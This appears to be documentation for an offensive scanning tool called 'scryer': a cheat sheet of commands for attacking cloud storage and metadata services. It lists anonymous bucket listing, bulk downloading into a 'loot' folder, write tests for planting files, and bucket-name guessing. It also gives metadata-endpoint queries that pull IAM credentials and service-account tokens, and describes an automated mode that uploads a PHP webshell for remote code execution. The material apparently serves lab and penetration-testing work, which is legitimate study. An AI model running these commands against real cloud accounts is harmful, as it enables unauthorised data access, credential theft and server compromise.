# Cloud storage & metadata cheat sheet

scryer scans web responses for cloud storage URLs (S3/GCS/Azure/DO Spaces) and
tests any bucket it finds for public/misconfigured access. This is the manual
follow-up.

> **scryer automation:** when it detects an S3-compatible API served by the
> target (LocalStack/MinIO on an `s3.<domain>` vhost, e.g. HTB Toppers) it
> automatically runs the anonymous listing with dummy creds. Add `--exploit`
> and it goes further: confirms the bucket is writable, uploads a PHP webshell,
> runs `id` through the front-end site to **confirm RCE**, then hunts common
> flag locations (`/var/www/flag.txt`, `user.txt`, `root.txt`, …) through the
> shell and **prints the captured flag**, then deletes the shell. Dummy creds
> used throughout:
> `AWS_ACCESS_KEY_ID=dummy AWS_SECRET_ACCESS_KEY=dummy`.

## AWS S3 buckets
```bash
# Public listing? (anonymous)
curl -s https://bucket-name.s3.amazonaws.com/
aws s3 ls s3://bucket-name --no-sign-request
aws s3 ls s3://bucket-name --no-sign-request --recursive

# Download everything readable
aws s3 sync s3://bucket-name ./loot --no-sign-request

# Writable? (misconfig — you can plant files)
echo test > t.txt
aws s3 cp t.txt s3://bucket-name/ --no-sign-request

# Guess bucket names from the target's domain/company:
for w in assets backup dev prod static media files uploads data; do
  echo "== $company-$w"; aws s3 ls s3://$company-$w --no-sign-request 2>&1 | head -1
done
```

## Azure Blob Storage
```bash
# Container listing via REST
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
curl -s https://ACCOUNT.blob.core.windows.net/CONTAINER/FILE
```

## Google Cloud Storage
```bash
curl -s https://storage.googleapis.com/BUCKET/
gsutil ls -r gs://BUCKET            # if authed
curl -s "https://www.googleapis.com/storage/v1/b/BUCKET/o"
```

## DigitalOcean Spaces
```bash
curl -s https://SPACE.REGION.digitaloceanspaces.com/
```

## Cloud metadata (SSRF / after landing on a cloud host)
```bash
# AWS IMDSv1 — creds live here
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# AWS IMDSv2 (token required)
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP (header required)
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

## Recon tools
```bash
cloud_enum -k companyname                 # sweeps AWS+Azure+GCP naming
s3scanner scan -f buckets.txt
# If you loot AWS keys:
aws sts get-caller-identity               # whoami
aws iam list-attached-user-policies --user-name <u>
```
